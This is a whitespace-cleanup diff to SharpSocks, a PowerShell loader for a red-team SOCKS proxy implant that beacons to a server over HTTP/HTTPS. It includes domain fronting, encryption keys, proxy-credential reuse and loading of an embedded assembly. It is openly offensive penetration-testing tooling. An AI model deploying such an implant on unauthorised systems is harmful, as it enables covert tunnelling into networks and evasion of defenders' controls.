@@ -4,7 +4,7 @@ $Global:Socks = $null
 $Global:BoolStart = $null
 $iLogOutput = $null
 $Comms = $null
-function SharpSocks 
+function SharpSocks
 {
     <#
     .Synopsis
@@ -12,27 +12,27 @@ function SharpSocks
 
         Tunnellable HTTP/HTTPS socks4a proxy written in C# and deployable via PowerShell
 
-        SharpSocks 2017 Nettitude
-        Rob Maslen @rbmaslen 
+        SharpSocks 2020 Nettitude
+        Rob Maslen @rbmaslen
 
     .DESCRIPTION
-        PS C:\> Usage: SharpSocks -Uri <Host> 
+        PS C:\> Usage: SharpSocks -Uri <Host>
     .EXAMPLE
-        Start the Implant(Client) specifying the web server (http://127.0.0.1:8081), the encryption keys and channel id. Also specify a list of URLs to use when making HTTP Request. Set the beacon time to 0.5 seconds 
+        Start the Implant(Client) specifying the web server (http://127.0.0.1:8081), the encryption keys and channel id. Also specify a list of URLs to use when making HTTP Request. Set the beacon time to 0.5 seconds
         PS C:\> SharpSocks -Client -Uri http://127.0.0.1:8081 -Key PTDWISSNRCThqmpWEzXFZ1nSusz10u0qZ0n0UjH66rs= -Channel 7f404221-9f30-470b-b05d-e1a922be3ff6 -URLs "site/review/access.php","upload/data/images" -Beacon 500
     .EXAMPLE
         Same as above using different list of URLs
         PS C:\> SharpSocks -Client -Uri http://127.0.0.1:8081 -Key PTDWISSNRCThqmpWEzXFZ1nSusz10u0qZ0n0UjH66rs= -Channel 7f404221-9f30-470b-b05d-e1a922be3ff6 -URLs "Upload","Push","Res" -Beacon 500
     .EXAMPLE
-        Sames as above but connect out via an authenticated proxy server 
+        Sames as above but connect out via an authenticated proxy server
         PS C:\> SharpSocks -Client -Uri http://127.0.0.1:8081 -ProxyUser bob -ProxyPass pass -ProxyDomain dom -ProxyUrl http://10.150.10.1:8080 -Key PTDWISSNRCThqmpWEzXFZ1nSusz10u0qZ0n0UjH66rs= -Channel 7f404221-9f30-470b-b05d-e1a922be3ff6 -URLs "Upload","Push","Res" -Beacon 500
     #>
     param(
-    [Parameter(Mandatory=$True)][string]$Uri, 
-    [Parameter(Mandatory=$False)]$URLs="Upload", 
-    [Parameter(Mandatory=$False)][switch]$Server, 
-    [Parameter(Mandatory=$False)][switch]$Client, 
-    [Parameter(Mandatory=$False)][int]$SocksPort=43334, 
+    [Parameter(Mandatory=$True)][string]$Uri,
+    [Parameter(Mandatory=$False)]$URLs="Upload",
+    [Parameter(Mandatory=$False)][switch]$Server,
+    [Parameter(Mandatory=$False)][switch]$Client,
+    [Parameter(Mandatory=$False)][int]$SocksPort=43334,
     [Parameter(Mandatory=$False)][string]$Channel,
     [Parameter(Mandatory=$False)][string]$IPAddress="0.0.0.0",
     [Parameter(Mandatory=$False)][string]$DomainFrontURL,
@@ -52,7 +52,7 @@ function SharpSocks
     echo "[-] Loading Assemblies"
     if ($psversiontable.CLRVersion.Major -lt 3) {
         echo "Not running on CLRVersion 4 or above. Try 'migrate' to use unmanaged powershell"
-    } 
+    }
     else {
         if (($SocksClientLoaded -ne "TRUE") -and ($Client.IsPresent)) {
             $Script:SocksClientLoaded = "TRUE"
@@ -63,17 +63,17 @@ function SharpSocks
             $gzipStream = New-Object System.IO.Compression.GzipStream $gzdll, ([IO.Compression.CompressionMode]::Decompress)
             try {
                 $buffer = New-Object byte[](32000);
-                while ($true) 
+                while ($true)
                 {
                     $read = $gzipStream.Read($buffer, 0, 32000)
-                    if ($read -le 0) 
+                    if ($read -le 0)
                     {
                         break;
                     }
                     $output.Write($buffer, 0, $read)
                 }
             }
-            finally 
+            finally
             {
                 Write-Verbose "Closing streams and newly decompressed file"
                 $gzipStream.Close();
@@ -98,7 +98,7 @@ function SharpSocks
         $Key = Create-AesKey
         }
 
-        $secureStringPwd = $Key | ConvertTo-SecureString -AsPlainText -Force 
+        $secureStringPwd = $Key | ConvertTo-SecureString -AsPlainText -Force
 
         #If there is no channel set
         if (!$Channel) {
@@ -107,17 +107,17 @@ function SharpSocks
 
         # Proxy Config
         if ($ProxyURL) {
-            $Proxy = New-Object System.Net.WebProxy($ProxyURL,$True); 
+            $Proxy = New-Object System.Net.WebProxy($ProxyURL,$True);
 
             if ($ProxyUser -and $ProxyPassword) {
                 $creds = new-object System.Net.NetworkCredential
                 $creds.UserName = $ProxyUser
                 $creds.Domain = $ProxyDomain
-                $creds.SecurePassword = ConvertTo-SecureString $ProxyPassword -AsPlainText -Force; 
+                $creds.SecurePassword = ConvertTo-SecureString $ProxyPassword -AsPlainText -Force;
                 $Proxy.Credentials = $Creds;
-            } else { 
+            } else {
                 $Proxy.UseDefaultCredentials = $True;
-            } 
+            }
         } else {
             $Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
             $Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
@@ -137,7 +137,7 @@ function SharpSocks
             $Script:Socks = [SocksProxy.Classes.Integration.PoshCreateProxy]::CreateSocksController($Uri, $Channel, $DomainFrontURL, $UserAgent, $secureStringPwd, $NewURLs, $Cookie1, $Cookie2, $Proxy, $Beacon, $Comms, $InsecureSSL);
             $Script:BoolStart = $Socks.Start()
             if ($BoolStart) {
-                echo "" 
+                echo ""
                 echo "[+] SharpSocks client Started!"
                 echo ""
                 echo "URLs:"
@@ -150,7 +150,7 @@ function SharpSocks
                 echo "Cookies: $Cookie1 $Cookie2"
                 echo "User-Agent: $UserAgent"
                 echo ""
-                echo "" 
+                echo ""
                 echo "[-] Run StopSocks to stop the client!"
                 echo ""
             }
@@ -167,18 +167,18 @@ function StopSocks {
         $Script:Socks.HARDStop()
         $Script:BoolStart = $Socks.Stop()
         $Script:BoolStart = $Socks.HARDStop()
-        echo "" 
+        echo ""
         echo "[-] SharpSocks stopped!"
         echo ""
     } else {
-        echo "" 
+        echo ""
         echo "[-] SharpSocks not running!"
         echo ""
     }
 }
 
 # creates a randon AES symetric encryption key
-function Create-AesManagedObject 
+function Create-AesManagedObject
 {
     param
     (
@@ -193,37 +193,37 @@ function Create-AesManagedObject
     $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
     $aesManaged.BlockSize = 128
     $aesManaged.KeySize = 256
-    if ($IV) 
+    if ($IV)
     {
-        if ($IV.getType().Name -eq 'String') 
+        if ($IV.getType().Name -eq 'String')
         {$aesManaged.IV = [System.Convert]::FromBase64String($IV)}
-        else 
+        else
         {$aesManaged.IV = $IV}
     }
-    if ($key) 
+    if ($key)
     {
-        if ($key.getType().Name -eq 'String') 
+        if ($key.getType().Name -eq 'String')
         {$aesManaged.Key = [System.Convert]::FromBase64String($key)}
-        else 
+        else
         {$aesManaged.Key = $key}
     }
     $aesManaged
 }
 
 # creates a randon AES symetric encryption key
-function Create-AesKey() 
+function Create-AesKey()
 {
     $aesManaged = Create-AesManagedObject
     $aesManaged.GenerateKey()
     [System.Convert]::ToBase64String($aesManaged.Key)
 }
 
-function Get-RandomChamnnel 
+function Get-RandomChamnnel
 {
     param ([int]$Length)
     $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
     $result = ''
-    for ($x = 0; $x -lt $Length; $x++) 
+    for ($x = 0; $x -lt $Length; $x++)
     {
         $result += $set | Get-Random
     }
